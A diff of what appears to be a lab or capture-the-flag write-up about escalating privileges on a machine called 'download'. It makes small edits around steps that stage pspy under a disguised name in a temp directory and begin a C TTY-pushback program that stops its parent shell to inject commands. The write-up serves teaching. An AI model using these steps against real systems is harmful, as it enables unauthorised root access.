@@ -292,7 +292,7 @@ scp pspy64 wesley@$rhost:~/nEcdd7
 # Run PSpy for five minutes
 cd `mktemp -d /tmp/05dJPb.XXXXXX` && mv ~/nEcdd7 . # Move pspy
 chmod 700 nEcdd7 # Make PSspy executable + private
-timeout 5m ./nEcdd7 -i 10 --ppid | tee pspy.log # Run pspy, display PPID, 5ms interval
+timeout 5m ./nEcdd7 -i 5 --ppid | tee pspy.log # Run pspy, display PPID, 5ms interval
 ```
 {:file="wesley@download (SSH) ➤ bash" .nolineno}
 
@@ -341,7 +341,7 @@ psql -U download -h localhost
 
 Looking back at the PSpy output, a group of interesting processes were started by a script executed as root. We began to reconstruct the process tree created by this script using the PIDs and PPIDs displayed in the PSpy output.
 
-```text
+```tree
 bash -i ./manage-db
 ├── systemctl status postgresql
 ├── systemctl status download-site
@@ -363,7 +363,7 @@ Since we had a path to access _postgres_, we could execute a [TTY Pushback](http
 int main(int argc, char *argv[]) {
   // Make sure a command is specified
   if (argc > 1) {
-    // Kill parent process
+    // Stop parent process
     kill(getppid(), SIGSTOP);
 
     // Send each char in command
